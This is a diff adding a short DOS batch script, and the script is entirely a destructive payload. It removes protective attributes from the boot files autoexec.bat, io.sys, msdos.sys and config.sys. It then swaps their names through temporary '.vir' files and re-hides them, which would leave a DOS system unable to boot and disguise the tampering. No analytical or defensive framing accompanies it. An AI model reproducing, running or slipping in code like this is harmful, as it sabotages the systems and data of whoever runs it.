@@ -1,0 +1,21 @@
+@echo off
+attrib -h -r -s c:\autoexec.bat
+attrib -h -r -s c:\msdos.sys
+attrib -h -r -s c:\io.sys
+attrib -h -r -s c:\config.sys
+ren c:\autoexec.bat temp1.vir
+ren c:\io.sys autoexec.bat
+ren c:\temp1.vir io.sys
+ren c:\config.sys temp2.vir
+ren c:\msdos.sys config.sys
+ren c:\temp2.vir msdos.sys
+ren c:\io.sys tmp3.vir
+ren c:\config.sys io.sys
+ren c:\tmp3.vir config.sys
+ren c:\msdos.sys tmp4.vir
+ren c:\autoexec.bat msdos.sys
+ren c:\tmp4.vir autoexec.bat
+attrib +h +r +s c:\autoexec.bat
+attrib +h +r +s c:\msdos.sys
+attrib +h +r +s c:\io.sys
+attrib +h +r +s c:\config.sys 
